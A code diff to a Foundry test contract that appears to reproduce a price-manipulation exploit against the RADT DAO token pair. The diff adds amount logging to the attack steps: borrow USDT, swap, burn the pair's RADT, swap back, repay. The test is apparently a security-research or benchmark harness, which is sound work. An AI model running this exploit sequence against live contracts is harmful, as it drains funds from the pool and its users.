@@ -222,20 +222,33 @@ contract RADTDAOTestBase is Test, BlockLoader {
 
     function test_gt() public {
         vm.startPrank(attacker);
+        emit log_named_uint("amt0", 1000e18);
         borrow_usdt_owner(1000e18);
         printBalance("After step0 ");
+        emit log_named_uint("amt1", usdt.balanceOf(attacker));
+        emit log_named_uint(
+            "amt2",
+            pair.getAmountOut(usdt.balanceOf(attacker), address(usdt))
+        );
         swap_pair_attacker_usdt_radt(
             usdt.balanceOf(attacker),
             pair.getAmountOut(usdt.balanceOf(attacker), address(usdt))
         );
         printBalance("After step1 ");
+        emit log_named_uint("amt3", (radt.balanceOf(address(pair)) * 100) / 9);
         burn_radt_pair((radt.balanceOf(address(pair)) * 100) / 9);
         printBalance("After step2 ");
+        emit log_named_uint("amt4", radt.balanceOf(attacker));
+        emit log_named_uint(
+            "amt5",
+            pair.getAmountOut(radt.balanceOf(attacker), address(radt))
+        );
         swap_pair_attacker_radt_usdt(
             radt.balanceOf(attacker),
             pair.getAmountOut(radt.balanceOf(attacker), address(radt))
         );
         printBalance("After step3 ");
+        emit log_named_uint("amt6", (1000e18 * 1003) / 1000);
         payback_usdt_owner((1000e18 * 1003) / 1000);
         printBalance("After step4 ");
         require(attackGoal(), "Attack failed!");
@@ -258,7 +271,7 @@ contract RADTDAOTestBase is Test, BlockLoader {
         burn_radt_pair(amt3);
         swap_pair_attacker_radt_usdt(amt4, amt5);
         payback_usdt_owner(amt6);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 }
